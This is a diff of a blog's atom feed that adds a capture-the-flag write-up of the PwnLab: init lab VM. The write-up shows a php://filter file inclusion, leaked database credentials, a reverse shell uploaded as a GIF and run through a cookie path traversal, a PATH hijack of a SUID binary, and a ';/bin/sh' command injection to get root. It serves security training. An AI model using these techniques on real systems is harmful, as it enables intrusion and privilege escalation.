@@ -4,7 +4,7 @@
   <title><![CDATA[Category: writeups | Core dump overflow]]></title>
   <link href="http://chousensha.github.io/blog/categories/writeups/atom.xml" rel="self"/>
   <link href="http://chousensha.github.io/"/>
-  <updated>2018-06-17T09:26:13-04:00</updated>
+  <updated>2018-08-26T12:37:36-04:00</updated>
   <id>http://chousensha.github.io/</id>
   <author>
     <name><![CDATA[chousensha]]></name>
@@ -12,6 +12,476 @@
   </author>
   <generator uri="http://octopress.org/">Octopress</generator>
 
+  
+  <entry>
+    <title type="html"><![CDATA[Pwnlab: init]]></title>
+    <link href="http://chousensha.github.io/blog/2018/08/25/pwnlab-init/"/>
+    <updated>2018-08-25T17:01:13-04:00</updated>
+    <id>http://chousensha.github.io/blog/2018/08/25/pwnlab-init</id>
+    <content type="html"><![CDATA[<p>Today&rsquo;s boot2root is called PwnLab: init and the goal is to read the flag in /root/flag.txt</p>
+
+<!-- more -->
+
+
+<p><code>
+Nmap scan report for 192.168.164.129
+Host is up (0.00099s latency).
+Not shown: 65531 closed ports
+PORT      STATE SERVICE VERSION
+80/tcp    open  http    Apache httpd 2.4.10 ((Debian))
+|_http-server-header: Apache/2.4.10 (Debian)
+|_http-title: PwnLab Intranet Image Hosting
+111/tcp   open  rpcbind 2-4 (RPC #100000)
+| rpcinfo:
+|   program version   port/proto  service
+|   100000  2,3,4        111/tcp  rpcbind
+|   100000  2,3,4        111/udp  rpcbind
+|   100024  1          37397/udp  status
+|_  100024  1          58026/tcp  status
+3306/tcp  open  mysql   MySQL 5.5.47-0+deb8u1
+| mysql-info:
+|   Protocol: 10
+|   Version: 5.5.47-0+deb8u1
+|   Thread ID: 38
+|   Capabilities flags: 63487
+|   Some Capabilities: InteractiveClient, LongColumnFlag, FoundRows, SupportsLoadDataLocal, Speaks41ProtocolOld, IgnoreSpaceBeforeParenthesis, ConnectWithDatabase, SupportsTransactions, LongPassword, Support41Auth, IgnoreSigpipes, DontAllowDatabaseTableColumn, Speaks41ProtocolNew, ODBCClient, SupportsCompression, SupportsAuthPlugins, SupportsMultipleStatments, SupportsMultipleResults
+|   Status: Autocommit
+|   Salt: pKc2lJniDVf|]&lt;Rg2bwQ
+|_  Auth Plugin Name: 88
+58026/tcp open  status  1 (RPC #100024)
+</code></p>
+
+<p>The website is an intranet portal for uploading images, but we have to login first.</p>
+
+<p><img class="center" src="/images/pentest/pwnlab_init/web.jpg" title="&lsquo;web server&rsquo; &lsquo;intranet portal&rsquo;" ></p>
+
+<p>I ran Nikto on it but there were no interesting finds, except for the following line:</p>
+
+<p><code>
++ /config.php: PHP Config file may contain database IDs and passwords.
+</code></p>
+
+<p>However, when I tried to read that file, all I got was a blank page. I&rsquo;ve noticed that the URLs for the pages look like this: <a href="http://192.168.164.129/?page=login">http://192.168.164.129/?page=login</a> for the login page and <a href="http://192.168.164.129/?page=upload">http://192.168.164.129/?page=upload</a> for the upload page. I tried some directory traversal and file inclusion techniques, thinking that this might be the way of reading the config.php file, but had no luck. However, as I was searching for a way on the internet, I came across this article on a <a href="https://diablohorn.com/2010/01/16/interesting-local-file-inclusion-method/">LFI method that uses PHP filters</a>. The below command allows reading the source of PHP files by using the filter functionality to base64 encode the contents of the file before reading it:</p>
+
+<p><code>url?page=php://filter/convert.base64-encode/resource=config</code></p>
+
+<p>This returned a base64 string that when decoded, gave me the MySQL credentials:</p>
+
+<p><code>
+&lt;?php
+$server   = "localhost";
+$username = "root";
+$password = "H4u%QJ_H99";
+$database = "Users";
+?&gt;
+</code></p>
+
+<p>Now we can connect to that database:</p>
+
+<p>```
+mysql -u root -h 192.168.217.143
+ERROR 1045 (28000): Access denied for user &lsquo;root&rsquo;@&lsquo;192.168.217.132&rsquo; (using password: NO)
+root@kali:~# mysql -u root -p -h 192.168.217.143
+Enter password:
+Welcome to the MariaDB monitor.  Commands end with ; or \g.
+Your MySQL connection id is 41
+Server version: 5.5.47-0+deb8u1 (Debian)</p>
+
+<p>Copyright &copy; 2000, 2017, Oracle, MariaDB Corporation Ab and others.</p>
+
+<p>Type &lsquo;help;&rsquo; or &lsquo;\h&rsquo; for help. Type &lsquo;\c&rsquo; to clear the current input statement.</p>
+
+<p>MySQL [(none)]> use Users
+Reading table information for completion of table and column names
+You can turn off this feature to get a quicker startup with -A</p>
+
+<p>Database changed
+MySQL [Users]><br/>
+```</p>
+
+<p>Let&rsquo;s see what we have here:</p>
+
+<p><code>
+MySQL [Users]&gt; show tables;
++-----------------+
+| Tables_in_Users |
++-----------------+
+| users           |
++-----------------+
+1 row in set (0.00 sec)
+MySQL [Users]&gt; select * from users;
++------+------------------+
+| user | pass             |
++------+------------------+
+| kent | Sld6WHVCSkpOeQ== |
+| mike | U0lmZHNURW42SQ== |
+| kane | aVN2NVltMkdSbw== |
++------+------------------+
+3 rows in set (0.05 sec)
+</code></p>
+
+<p>3 users with base64 encoded passwords!</p>
+
+<p><code>
+kent / JWzXuBJJNy
+mike / SIfdsTEn6I
+kane / iSv5Ym2GRo
+</code></p>
+
+<p>I logged in as kent and tried uploading a PHP reverse shell, but got an error stating that the file type is not allowed. Using the previous LFI method, let&rsquo;s take a look at the source code of the upload page:</p>
+
+<p><div class='bogus-wrapper'><notextile><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+<span class='line-number'>32</span>
+<span class='line-number'>33</span>
+<span class='line-number'>34</span>
+<span class='line-number'>35</span>
+<span class='line-number'>36</span>
+<span class='line-number'>37</span>
+<span class='line-number'>38</span>
+<span class='line-number'>39</span>
+<span class='line-number'>40</span>
+<span class='line-number'>41</span>
+<span class='line-number'>42</span>
+<span class='line-number'>43</span>
+<span class='line-number'>44</span>
+<span class='line-number'>45</span>
+<span class='line-number'>46</span>
+<span class='line-number'>47</span>
+<span class='line-number'>48</span>
+<span class='line-number'>49</span>
+<span class='line-number'>50</span>
+<span class='line-number'>51</span>
+<span class='line-number'>52</span>
+<span class='line-number'>53</span>
+<span class='line-number'>54</span>
+<span class='line-number'>55</span>
+<span class='line-number'>56</span>
+</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="o">&lt;</span><span class="nx">br</span><span class="o">/&gt;</span>
+</span><span class='line'><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="o">?</span><span class="nx">php</span>
+</span><span class='line'><span class="nb">session_start</span><span class="p">();</span>
+</span><span class='line'><span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="o">&amp;</span><span class="nx">lsquo</span><span class="p">;</span><span class="nx">user</span><span class="o">&amp;</span><span class="nx">rsquo</span><span class="p">;]))</span> <span class="p">{</span> <span class="k">die</span><span class="p">(</span><span class="o">&amp;</span><span class="nx">lsquo</span><span class="p">;</span><span class="nx">You</span> <span class="nx">must</span> <span class="nx">be</span> <span class="nx">log</span> <span class="nx">in</span><span class="o">.&amp;</span><span class="nx">rsquo</span><span class="p">;);</span> <span class="p">}</span>
+</span><span class='line'><span class="cp">?&gt;</span><span class="x"></span>
+</span><span class='line'><span class="x">&lt;html&gt;&lt;/p&gt;</span>
+</span><span class='line'>
+</span><span class='line'><span class="x">&lt;pre&gt;&lt;code&gt;&amp;lt;body&amp;gt;</span>
+</span><span class='line'><span class="x">    &amp;lt;form action=&#39;&#39; method=&#39;post&#39; enctype=&#39;multipart/form-data&#39;&amp;gt;</span>
+</span><span class='line'><span class="x">        &amp;lt;input type=&#39;file&#39; name=&#39;file&#39; id=&#39;file&#39; /&amp;gt;</span>
+</span><span class='line'><span class="x">        &amp;lt;input type=&#39;submit&#39; name=&#39;submit&#39; value=&#39;Upload&#39;/&amp;gt;</span>
+</span><span class='line'><span class="x">    &amp;lt;/form&amp;gt;</span>
+</span><span class='line'><span class="x">&amp;lt;/body&amp;gt;</span>
+</span><span class='line'><span class="x">&lt;/code&gt;&lt;/pre&gt;</span>
+</span><span class='line'>
+</span><span class='line'><span class="x">&lt;p&gt;&lt;/html&gt;</span>
+</span><span class='line'><span class="x">&amp;lt;?php</span>
+</span><span class='line'><span class="x">if(isset($_POST[&amp;lsquo;submit&amp;rsquo;])) {&lt;/p&gt;</span>
+</span><span class='line'>
+</span><span class='line'><span class="x">&lt;pre&gt;&lt;code&gt;if ($_FILES[&#39;file&#39;][&#39;error&#39;] &amp;lt;= 0) {</span>
+</span><span class='line'><span class="x">    $filename  = $_FILES[&#39;file&#39;][&#39;name&#39;];</span>
+</span><span class='line'><span class="x">    $filetype  = $_FILES[&#39;file&#39;][&#39;type&#39;];</span>
+</span><span class='line'><span class="x">    $uploaddir = &#39;upload/&#39;;</span>
+</span><span class='line'><span class="x">    $file_ext  = strrchr($filename, &#39;.&#39;);</span>
+</span><span class='line'><span class="x">    $imageinfo = getimagesize($_FILES[&#39;file&#39;][&#39;tmp_name&#39;]);</span>
+</span><span class='line'><span class="x">    $whitelist = array(&quot;.jpg&quot;,&quot;.jpeg&quot;,&quot;.gif&quot;,&quot;.png&quot;); </span>
+</span><span class='line'>
+</span><span class='line'><span class="x">    if (!(in_array($file_ext, $whitelist))) {</span>
+</span><span class='line'><span class="x">        die(&#39;Not allowed extension, please upload images only.&#39;);</span>
+</span><span class='line'><span class="x">    }</span>
+</span><span class='line'>
+</span><span class='line'><span class="x">    if(strpos($filetype,&#39;image&#39;) === false) {</span>
+</span><span class='line'><span class="x">        die(&#39;Error 001&#39;);</span>
+</span><span class='line'><span class="x">    }</span>
+</span><span class='line'>
+</span><span class='line'><span class="x">    if($imageinfo[&#39;mime&#39;] != &#39;image/gif&#39; &amp;amp;&amp;amp; $imageinfo[&#39;mime&#39;] != &#39;image/jpeg&#39; &amp;amp;&amp;amp; $imageinfo[&#39;mime&#39;] != &#39;image/jpg&#39;&amp;amp;&amp;amp; $imageinfo[&#39;mime&#39;] != &#39;image/png&#39;) {</span>
+</span><span class='line'><span class="x">        die(&#39;Error 002&#39;);</span>
+</span><span class='line'><span class="x">    }</span>
+</span><span class='line'>
+</span><span class='line'><span class="x">    if(substr_count($filetype, &#39;/&#39;)&amp;gt;1){</span>
+</span><span class='line'><span class="x">        die(&#39;Error 003&#39;);</span>
+</span><span class='line'><span class="x">    }</span>
+</span><span class='line'>
+</span><span class='line'><span class="x">    $uploadfile = $uploaddir . md5(basename($_FILES[&#39;file&#39;][&#39;name&#39;])).$file_ext;</span>
+</span><span class='line'>
+</span><span class='line'><span class="x">    if (move_uploaded_file($_FILES[&#39;file&#39;][&#39;tmp_name&#39;], $uploadfile)) {</span>
+</span><span class='line'><span class="x">        echo &quot;&amp;lt;img src=\&quot;&quot;.$uploadfile.&quot;\&quot;&amp;gt;&amp;lt;br /&amp;gt;&quot;;</span>
+</span><span class='line'><span class="x">    } else {</span>
+</span><span class='line'><span class="x">        die(&#39;Error 4&#39;);</span>
+</span><span class='line'><span class="x">    }</span>
+</span><span class='line'><span class="x">}</span>
+</span><span class='line'><span class="x">&lt;/code&gt;&lt;/pre&gt;</span>
+</span><span class='line'>
+</span><span class='line'><span class="x">&lt;p&gt;}&lt;/p&gt;</span>
+</span><span class='line'>
+</span><span class='line'><span class="x">&lt;p&gt;?&gt;</span>
+</span></code></pre></td></tr></table></div></figure></notextile></div></p>
+
+<p>We can see that the file will get uploaded to the /upload folder with an MD5 name and that it has to be an image file of the 4 allowed types, complete with a matching MIME type. To test it, I changed pentestmonkey&rsquo;s reverse shell extension to .gif and added the magic string at the beginning of the file (GIF98). Then I pushed the upload button and bingo! The shell has been successfully deployed at <code>upload/ff280c52a4fbcbea847ca4a2d69ce6c0.gif</code></p>
+
+<p>My listener is prepared and all, but there is still the matter of how to execute the shell. For any possible hint, I&rsquo;ve looked t the source code of the index page:</p>
+
+<p><div class='bogus-wrapper'><notextile><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+<span class='line-number'>32</span>
+<span class='line-number'>33</span>
+<span class='line-number'>34</span>
+<span class='line-number'>35</span>
+<span class='line-number'>36</span>
+<span class='line-number'>37</span>
+</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="o">?</span><span class="nx">php</span>
+</span><span class='line'><span class="c1">//Multilingual. Not implemented yet.</span>
+</span><span class='line'><span class="c1">//setcookie(&amp;ldquo;lang&amp;rdquo;,&amp;ldquo;en.lang.php&amp;rdquo;);</span>
+</span><span class='line'><span class="k">if</span> <span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_COOKIE</span><span class="p">[</span><span class="o">&amp;</span><span class="nx">lsquo</span><span class="p">;</span><span class="nx">lang</span><span class="o">&amp;</span><span class="nx">rsquo</span><span class="p">;]))</span>
+</span><span class='line'><span class="p">{</span><span class="o">&lt;/</span><span class="nx">p</span><span class="o">&gt;</span>
+</span><span class='line'>
+</span><span class='line'><span class="o">&lt;</span><span class="nx">pre</span><span class="o">&gt;&lt;</span><span class="nx">code</span><span class="o">&gt;</span><span class="k">include</span><span class="p">(</span><span class="s2">&quot;lang/&quot;</span><span class="o">.</span><span class="nv">$_COOKIE</span><span class="p">[</span><span class="s1">&#39;lang&#39;</span><span class="p">]);</span>
+</span><span class='line'><span class="o">&lt;/</span><span class="nx">code</span><span class="o">&gt;&lt;/</span><span class="nx">pre</span><span class="o">&gt;</span>
+</span><span class='line'>
+</span><span class='line'><span class="o">&lt;</span><span class="nx">p</span><span class="o">&gt;</span><span class="p">}</span>
+</span><span class='line'><span class="c1">// Not implemented yet.</span>
+</span><span class='line'><span class="cp">?&gt;</span><span class="x"></span>
+</span><span class='line'><span class="x">&lt;html&gt;</span>
+</span><span class='line'><span class="x">&lt;head&gt;</span>
+</span><span class='line'><span class="x">&lt;title&gt;PwnLab Intranet Image Hosting&lt;/title&gt;</span>
+</span><span class='line'><span class="x">&lt;/head&gt;</span>
+</span><span class='line'><span class="x">&lt;body&gt;&lt;/p&gt;</span>
+</span><span class='line'>
+</span><span class='line'><span class="x">&lt;center&gt;</span>
+</span><span class='line'><span class="x">&lt;img src=&quot;images/pwnlab.png&quot;&gt;&lt;br /&gt;</span>
+</span><span class='line'><span class="x">[ &lt;a href=&quot;http://chousensha.github.io/&quot;&gt;Home&lt;/a&gt; ] [ &lt;a href=&quot;?page=login&quot;&gt;Login&lt;/a&gt; ] [ &lt;a href=&quot;?page=upload&quot;&gt;Upload&lt;/a&gt; ]</span>
+</span><span class='line'><span class="x">&lt;hr/&gt;&lt;br/&gt;</span>
+</span><span class='line'><span class="cp">&lt;?php</span>
+</span><span class='line'>    <span class="k">if</span> <span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;page&#39;</span><span class="p">]))</span>
+</span><span class='line'>    <span class="p">{</span>
+</span><span class='line'>        <span class="k">include</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;page&#39;</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot;.php&quot;</span><span class="p">);</span>
+</span><span class='line'>    <span class="p">}</span>
+</span><span class='line'>    <span class="k">else</span>
+</span><span class='line'>    <span class="p">{</span>
+</span><span class='line'>        <span class="k">echo</span> <span class="s2">&quot;Use this server to upload and share image files inside the intranet&quot;</span><span class="p">;</span>
+</span><span class='line'>    <span class="p">}</span>
+</span><span class='line'><span class="cp">?&gt;</span><span class="x"></span>
+</span><span class='line'><span class="x">&lt;/center&gt;</span>
+</span><span class='line'>
+</span><span class='line'>
+</span><span class='line'><span class="x">&lt;p&gt;&lt;/body&gt;</span>
+</span><span class='line'><span class="x">&lt;/html&gt;</span>
+</span></code></pre></td></tr></table></div></figure></notextile></div></p>
+
+<p>That cookie parameter looks vulnerable if we can include a file of our choosing. I tested it by replaying a request in Burp and using the following LFI for the cookie value:</p>
+
+<p><code>
+Cookie: lang=../../../../etc/passwd
+</code></p>
+
+<p>The response came back with the contents of the passwd file, so it worked! I did the same, this time setting the cookie to the path of the previously uploaded shell:</p>
+
+<p><code>
+Cookie: lang=../upload/ff280c52a4fbcbea847ca4a2d69ce6c0.gif
+</code></p>
+
+<p>And in our listener, we have a hit!</p>
+
+<p><code>
+nc -vnlp 8888
+listening on [any] 8888 ...
+connect to [192.168.217.132] from (UNKNOWN) [192.168.217.143] 36356
+Linux pwnlab 3.16.0-4-686-pae #1 SMP Debian 3.16.7-ckt20-1+deb8u4 (2016-02-29) i686 GNU/Linux
+ 11:08:31 up  2:34,  0 users,  load average: 0.00, 0.01, 0.05
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+/bin/sh: 0: can't access tty; job control turned off
+$ python -c "import pty;pty.spawn('/bin/sh');"
+</code></p>
+
+<p>I&rsquo;ve proceeded to switch through the 3 users for which I got the passwords earlier and see what can be done. Nothing interesting from kent, getting an authentication failure as mike, but in kane&rsquo;s home folder there&rsquo;s an interesting SUID binary called <em>msgmike</em></p>
+
+<p><code>
+-rwsr-sr-x 1 mike mike 5.1K Mar 17  2016 msgmike
+</code></p>
+
+<p>Trying to run it gives an error:</p>
+
+<p><code>
+kane@pwnlab:~$ ./msgmike
+./msgmike
+cat: /home/mike/msg.txt: No such file or directory
+</code></p>
+
+<p>Interesting, this calls cat, but not from an absolute path. So if we create a malicious binary called cat and add kane&rsquo;s home to the PATH variable, we should be able to run an arbitrary program with mike&rsquo;s privileges.</p>
+
+<p><code>
+kane@pwnlab:~$ echo "/bin/bash" &gt; cat
+echo "/bin/bash" &gt; cat
+kane@pwnlab:~$ chmod 777 cat
+chmod 777 cat
+</code></p>
+
+<p>Here we want to run bash as mike. Let&rsquo;s see how the PATH looks:</p>
+
+<p><code>
+kane@pwnlab:~$ echo $PATH
+echo $PATH
+/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games
+</code></p>
+
+<p>Now let&rsquo;s add the current location to the PATH:</p>
+
+<p><code>
+export PATH=.:$PATH
+kane@pwnlab:~$ echo $PATH
+echo $PATH
+.:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games:
+</code></p>
+
+<p>Running the binary turns us into mike!</p>
+
+<p><code>
+kane@pwnlab:~$ ./msgmike
+./msgmike
+mike@pwnlab:~$
+</code></p>
+
+<p>In mike&rsquo;s home there is another SUID binary, this time owned by root. We can see where this is going..</p>
+
+<p><code>
+-rwsr-sr-x 1 root root 5.3K Mar 17  2016 msg2root
+mike@pwnlab:/home/mike$ ./msg2root
+./msg2root
+Message for root: pwn incoming
+pwn incoming
+pwn incoming
+</code></p>
+
+<p>This binary takes an input and outputs it to the screen, while also appending it to a file in root&rsquo;s home (below line is taken from strings output)</p>
+
+<p><code>
+/bin/echo %s &gt;&gt; /root/messages.txt
+</code></p>
+
+<p>We can chain commands by passing a string for the echo function and then adding a second command with <code>;</code>:</p>
+
+<p>```
+./msg2root
+./msg2root
+Message for root: hey;/bin/sh
+hey;/bin/sh
+hey</p>
+
+<h1></h1>
+
+<p>```</p>
+
+<p>We&rsquo;re root now! Read the flag and game over:</p>
+
+<p>```</p>
+
+<h1>cat flag.txt</h1>
+
+<p>cat flag.txt
+.&ndash;=~=&ndash;.                                                                 .&ndash;=~=&ndash;.
+(<strong>  <em>)&ndash;.</em>.&ndash;=&ndash;.<em>.&ndash;=&ndash;.</em>.&ndash;=&ndash;.<em>.&ndash;=&ndash;.</em>.&ndash;=&ndash;.<em>.&ndash;=&ndash;.</em>.&ndash;=&ndash;.<em>.&ndash;=&ndash;.</em>.&ndash;=&ndash;.<em>.&ndash;=&ndash;.</em>.&ndash;(</strong>  <em>)
+(</em> <strong><em>)  </em></strong><strong>                             _                            (<em> </em></strong>)
+(<strong>  _) /  </strong> \                           | |                           (<strong>  _)
+( _ </strong>) | /  \/ <em><strong>  _ </strong>   <strong> _ _ </strong> __ </em>| |<em> </em><strong>                      ( _ </strong>)
+(<strong>  <em>) | |    / _ \| &lsquo;</em> \ / _<code>| '__/ _</code> | </strong>/ <strong>|                     (</strong>  <em>)
+(</em> <strong><em>) | _</em>/\ (<em>) | | | | (</em>| | | | (<em>| | |</em>_<em> \                     (</em> </strong><em>)
+(__  </em>)  _<em><strong>/_</strong>/|</em>| |<em>|_</em>, |<em>|  _</em>,<em>|_</em>|<em><strong>/                     (</strong>  </em>)
+( _ <strong>)                     </strong>/ |                                       ( _ <strong>)
+(</strong>  <em>)                    |</em><strong>/                                        (</strong>  <em>)
+(__  </em>)                                                                 (<strong>  <em>)
+(</em> </strong><em>) If  you are  reading this,  means  that you have  break 'init&rsquo;  (</em> <em><strong>)
+( _ </strong>) Pwnlab.  I hope  you enjoyed  and thanks  for  your time doing  ( _ <strong>)
+(</strong>  </em>) this challenge.                                                 (<strong>  <em>)
+(</em> </strong><em>)                                                                 (</em> <em><strong>)
+( _ </strong>) Please send me  your  feedback or your  writeup,  I will  love  ( _ <strong>)
+(</strong>  </em>) reading it                                                      (<strong>  _)
+(</strong>  <em>)                                                                 (__  </em>)
+(<strong>  _)                                             For sniferl4bs.com  (</strong>  <em>)
+( _ <strong>)                                <a href="&#x6d;&#97;&#105;&#108;&#x74;&#111;&#58;&#x63;&#108;&#x61;&#111;&#x72;&#64;&#80;&#119;&#110;&#x4c;&#97;&#x62;&#46;&#110;&#101;&#116;">&#x63;&#x6c;&#97;&#x6f;&#x72;&#x40;&#x50;&#x77;&#x6e;&#x4c;&#x61;&#x62;&#46;&#x6e;&#x65;&#116;</a> &ndash; @Chronicoder  ( _ </strong>)
+(__  </em>)                                                                 (<strong>  <em>)
+(</em> </strong><em>)&ndash;.</em>.&ndash;=&ndash;.<em>.&ndash;=&ndash;.</em>.&ndash;=&ndash;.<em>.&ndash;=&ndash;.</em>.&ndash;=&ndash;.<em>.&ndash;=&ndash;.</em>.&ndash;=&ndash;.<em>.&ndash;=&ndash;.</em>.&ndash;=&ndash;.<em>.&ndash;=&ndash;.</em>.&ndash;(<em> </em><em>_)
+`&ndash;.</em>.&ndash;&lsquo;             <br/>
+```</p>
+
+<p>This was a nice challenge with the LFI twist! A new technique added to our repertoire, and another boot2root completed!</p>
+
+<p>```</p>
+
+<hr />
+
+<p>/ You&rsquo;re currently going through a   \
+| difficult transition period called |
+\ &ldquo;Life.&rdquo;                            /</p>
+
+<hr />
+
+<pre><code>    \   ^__^
+     \  (oo)\_______
+        (__)\       )\/\
+            ||----w |
+            ||     ||
+</code></pre>
+
+<p>```</p>
+]]></content>
+  </entry>
   
   <entry>
     <title type="html"><![CDATA[Destroy The Necromancer]]></title>
@@ -1303,11 +1773,11 @@ Hydra (<a href="http://www.thc.org/thc-hydra">http://www.thc.org/thc-hydra</a>) 
 
 <p>```</p>
 
-<h2>ssh <a href="&#109;&#x61;&#x69;&#x6c;&#116;&#x6f;&#x3a;&#x53;&#72;&#97;&#x79;&#115;&#108;&#101;&#x74;&#x74;&#x40;&#49;&#x39;&#x32;&#x2e;&#x31;&#54;&#56;&#x2e;&#50;&#49;&#x37;&#x2e;&#49;&#52;&#x31;">&#x53;&#x48;&#97;&#x79;&#115;&#x6c;&#101;&#116;&#116;&#64;&#x31;&#57;&#50;&#46;&#x31;&#x36;&#56;&#x2e;&#x32;&#49;&#55;&#x2e;&#49;&#52;&#x31;</a></h2>
+<h2>ssh <a href="&#x6d;&#x61;&#105;&#108;&#x74;&#111;&#x3a;&#x53;&#x48;&#x61;&#121;&#x73;&#108;&#x65;&#116;&#x74;&#64;&#49;&#57;&#50;&#x2e;&#x31;&#x36;&#56;&#46;&#50;&#49;&#55;&#x2e;&#x31;&#52;&#49;">&#83;&#72;&#97;&#x79;&#x73;&#x6c;&#101;&#116;&#x74;&#x40;&#49;&#x39;&#50;&#46;&#49;&#54;&#56;&#46;&#50;&#x31;&#x37;&#x2e;&#49;&#x34;&#x31;</a></h2>
 
 <h2>~          Barry, don&rsquo;t forget to put a message here           ~</h2>
 
-<p><a href="&#109;&#x61;&#105;&#108;&#x74;&#x6f;&#x3a;&#83;&#x48;&#97;&#121;&#x73;&#x6c;&#101;&#x74;&#x74;&#x40;&#x31;&#x39;&#x32;&#46;&#x31;&#54;&#x38;&#46;&#50;&#49;&#x37;&#46;&#49;&#x34;&#x31;">&#x53;&#x48;&#x61;&#121;&#x73;&#x6c;&#101;&#116;&#x74;&#64;&#x31;&#57;&#50;&#46;&#x31;&#54;&#x38;&#x2e;&#x32;&#49;&#55;&#x2e;&#x31;&#52;&#x31;</a>&rsquo;s password:
+<p><a href="&#109;&#x61;&#105;&#x6c;&#116;&#111;&#58;&#83;&#x48;&#x61;&#x79;&#115;&#108;&#101;&#x74;&#x74;&#64;&#49;&#x39;&#50;&#46;&#x31;&#54;&#56;&#46;&#x32;&#x31;&#x37;&#x2e;&#49;&#x34;&#x31;">&#83;&#x48;&#x61;&#121;&#115;&#x6c;&#101;&#x74;&#116;&#64;&#x31;&#57;&#50;&#x2e;&#x31;&#54;&#x38;&#46;&#50;&#49;&#55;&#46;&#49;&#52;&#x31;</a>&rsquo;s password:
 Welcome back!</p>
 
 <p>SHayslett@red:~$
@@ -1526,9 +1996,9 @@ nikto -h 192.168.217.141:12380</p>
 <hr />
 
 <ul>
-<li>SSL Info:        Subject:  /C=UK/ST=Somewhere in the middle of nowhere/L=Really, what are you meant to put here?/O=Initech/OU=Pam: I give up. no idea what to put here./CN=Red.Initech/emailAddress=<a href="&#x6d;&#x61;&#105;&#x6c;&#116;&#x6f;&#58;&#112;&#97;&#109;&#x40;&#x72;&#101;&#x64;&#x2e;&#108;&#x6f;&#x63;&#x61;&#x6c;&#x68;&#x6f;&#x73;&#116;">&#112;&#x61;&#109;&#64;&#114;&#101;&#x64;&#46;&#x6c;&#x6f;&#x63;&#97;&#108;&#104;&#111;&#x73;&#116;</a>
+<li>SSL Info:        Subject:  /C=UK/ST=Somewhere in the middle of nowhere/L=Really, what are you meant to put here?/O=Initech/OU=Pam: I give up. no idea what to put here./CN=Red.Initech/emailAddress=<a href="&#109;&#x61;&#x69;&#108;&#116;&#111;&#58;&#112;&#x61;&#109;&#64;&#114;&#x65;&#x64;&#x2e;&#x6c;&#111;&#x63;&#x61;&#x6c;&#x68;&#x6f;&#x73;&#x74;">&#x70;&#x61;&#x6d;&#x40;&#x72;&#x65;&#100;&#x2e;&#x6c;&#x6f;&#99;&#x61;&#108;&#104;&#x6f;&#x73;&#x74;</a>
                  Ciphers:  ECDHE-RSA-AES256-GCM-SHA384
-                 Issuer:   /C=UK/ST=Somewhere in the middle of nowhere/L=Really, what are you meant to put here?/O=Initech/OU=Pam: I give up. no idea what to put here./CN=Red.Initech/emailAddress=<a href="&#x6d;&#97;&#x69;&#108;&#x74;&#x6f;&#x3a;&#x70;&#97;&#x6d;&#64;&#x72;&#101;&#100;&#46;&#x6c;&#111;&#99;&#x61;&#108;&#x68;&#x6f;&#x73;&#x74;">&#x70;&#x61;&#x6d;&#x40;&#x72;&#101;&#x64;&#46;&#x6c;&#111;&#x63;&#97;&#108;&#104;&#x6f;&#115;&#x74;</a>
+                 Issuer:   /C=UK/ST=Somewhere in the middle of nowhere/L=Really, what are you meant to put here?/O=Initech/OU=Pam: I give up. no idea what to put here./CN=Red.Initech/emailAddress=<a href="&#x6d;&#97;&#105;&#108;&#x74;&#x6f;&#x3a;&#112;&#97;&#109;&#x40;&#x72;&#x65;&#x64;&#46;&#108;&#111;&#x63;&#97;&#108;&#x68;&#x6f;&#x73;&#x74;">&#x70;&#97;&#x6d;&#64;&#114;&#101;&#x64;&#x2e;&#108;&#x6f;&#99;&#x61;&#108;&#x68;&#111;&#115;&#x74;</a>
 
 <ul>
 <li>Start Time:         2018-06-01 06:46:45 (GMT-4)</li>
@@ -2029,7 +2499,7 @@ sec-9720.txt
 <h1>Back To The Future: Unix Wildcards Gone Wild</h1>
 
 <ul>
